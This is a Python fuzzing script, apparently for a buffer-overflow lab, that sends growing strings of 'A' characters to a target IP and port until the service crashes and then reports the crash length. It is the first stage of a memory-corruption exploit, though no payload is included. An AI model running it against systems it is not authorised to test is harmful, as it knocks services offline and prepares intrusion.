#!/usr/bin/env python3

import socket
import time
import sys
import argparse

# Set up argument parsing
parser = argparse.ArgumentParser(description="Fuzzing script to identify buffer overflow vulnerability.")
parser.add_argument("ip", help="Target IP address")
parser.add_argument("port", type=int, help="Target port number (1-65535)")
parser.add_argument("--prefix", default="", help="Optional prefix string to send before payload (e.g., 'OVERFLOW1 ')")

args = parser.parse_args()

# Validate port range
if not (0 < args.port < 65536):
    print("Error: Port must be an integer between 1 and 65535.")
    sys.exit(1)

ip = args.ip
port = args.port
prefix = args.prefix
timeout = 5

string = prefix + "A" * 100

while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((ip, port))
            s.recv(1024)
            print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
            s.send(bytes(string, "latin-1"))
            s.recv(1024)
    except Exception:
        print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
        sys.exit(0)

    string += "A" * 100
    time.sleep(1)
